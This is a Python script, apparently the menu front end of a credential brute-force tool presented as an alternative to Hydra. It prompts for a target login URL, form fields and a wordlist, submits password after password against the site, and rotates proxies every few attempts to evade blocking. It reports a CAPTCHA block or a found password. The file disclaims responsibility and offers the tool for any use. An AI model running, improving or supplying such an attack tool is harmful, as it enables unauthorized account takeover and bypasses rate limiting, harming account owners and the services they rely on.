import os
import sys
import time
from module import UniversalBruter

def menu():
    os.system('clear')
    print("=" * 45)
    print("Un-Rooted Alternative To Hydra. ")
    print("do what ever u want don't blame me tho ") 
    print("=" * 45)
    
    target = input("[?] Target URL: ")
    user = input("[?] Username: ")
    u_field = input("[?] User Field Name: ")
    p_field = input("[?] Pass Field Name: ")
    fail = input("[?] Failure String: ")
    w_list = input("[?] Wordlist Path: ")
    json_mode = input("[?] Use JSON? (y/n): ").lower() == 'y'
    proxy_file = input("[?] Proxy List Path (Enter to skip): ")

    proxies = []
    if proxy_file:
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f]

    scanner = UniversalBruter(target, u_field, p_field, user, fail)
    
    print("\n" + "-" * 45)
    print(f"[*] Starting Attack on {target}")
    print("-" * 45 + "\n")

    try:
        with open(w_list, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                pwd = line.strip()
                
                if proxies and i % 5 == 0:
                    px = random.choice(proxies)
                    scanner.update_proxy(px)
                
                res = scanner.attempt(pwd, use_json=json_mode)
                
                if res == "CAPTCHA":
                    print(f"\n[!] Blocked by CAPTCHA/Bot Detection at: {pwd}")
                    return
                elif res == "ERROR":
                    sys.stdout.write(f"\r[!] Connection Error on: {pwd[:10]}...")
                elif res is True:
                    print(f"\n\n[+] SUCCESS!")
                    print(f"[+] Password: {pwd}")
                    print(f"[+] Found at attempt: {i+1}")
                    return
                
                sys.stdout.write(f"\r[*] Attempt {i+1}: {pwd[:15]}...")
                sys.stdout.flush()
                
        print("\n\n[-] Finished: Password not found.")
    except KeyboardInterrupt:
        print("\n\n[!] Aborted by user.")
    except Exception as e:
        print(f"\n[ERROR] {e}")

if __name__ == "__main__":
    menu()
